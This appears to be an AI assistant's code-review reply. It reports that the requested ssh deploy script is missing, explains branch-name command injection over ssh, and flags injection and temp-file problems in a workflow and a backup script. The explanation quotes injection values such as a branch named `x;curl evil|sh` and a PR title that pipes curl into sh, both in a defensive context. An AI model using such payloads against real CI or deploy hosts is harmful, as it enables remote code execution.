I couldn't find the script you described. Nothing in this workspace builds an ssh command from a branch name, so I haven't reviewed it yet.

I searched every tracked file for `ssh`, `scp`, `branch`, `REF_NAME` and `deploy`. The closest matches are two other files:

- **`.github/workflows/deploy.yml`** is a deploy workflow, but all it does is `echo` the PR title. There's no ssh step and no branch name.
- **`scripts/backup.sh`** is the only shell script here. It runs `scp`, but on fixed values, not a branch name.

It may live on another branch or in another repo, or the CI config may still be uncommitted. If you paste it or give me the path, I'll review it.

## What I'll be checking for

Building the remote command as a string is the main risk. ssh joins its arguments and the remote shell parses the result again. A branch named something like `x;curl evil|sh` or `$(…)` would then run commands on the deploy host, and anyone who can push a branch or open a PR can choose that name. Quoting it locally doesn't help, because the quotes are gone before the remote shell parses it. The safe pattern is:

```bash
if [[ ! ${branch} =~ ^[A-Za-z0-9._/-]+$ || ${branch} == -* || ${branch} == *..* ]]; then
  printf 'invalid branch name: %s\n' "${branch}" >&2
  exit 2
fi
# Fixed remote script; the branch travels as a quoted positional argument.
ssh -- "${host}" "bash -s -- $(printf '%q' "${branch}")" < deploy-remote.sh
```

The allowlist check is what actually protects you; `%q` is a second layer of defence. Better still, have the remote side take a commit SHA and check it against `^[0-9a-f]{40}$`.

## Problems in the files that do exist

**`.github/workflows/deploy.yml`**
- **Line 14:** `${{ github.event.pull_request.title }}` is pasted into the shell script before it runs, so a PR title like `"; curl …|sh; "` executes on the runner. Pass it through `env: TITLE: ${{ … }}` and use `"$TITLE"`.
- **Line 7:** `permissions: write-all` gives the token full write access. Set `contents: read` and add only what the job needs.

**`scripts/backup.sh`**
- **Line 1:** There's no `set -Eeuo pipefail`. If `tar` fails, `scp` still runs and uploads a partial or missing archive.
- **Lines 7–8:** `/tmp/backup.$$` is a predictable path, so another local user can create it first or put a symlink there. Use `mktemp -d`, with an `EXIT`/`INT`/`TERM` trap installed beforehand.
- **Line 13:** cleanup only happens if the script reaches the end. Any failure leaves the data archive sitting in `/tmp`.
- **Lines 10–11:** none of the variables are quoted, and it uses backticks. Quote every variable and use `$(date +%F)`.
- **Line 11:** the remote path in `scp` is parsed again on the remote side. That's harmless with today's constants but breaks as soon as the path contains data.
- It runs from cron but doesn't set its own `PATH` or `umask`. With no `umask`, the archive can be created readable by other users.

I only read these files; I don't have a shell here, so I haven't run `shellcheck`, `bash -n` or the script itself. Run those once the real deploy script turns up.
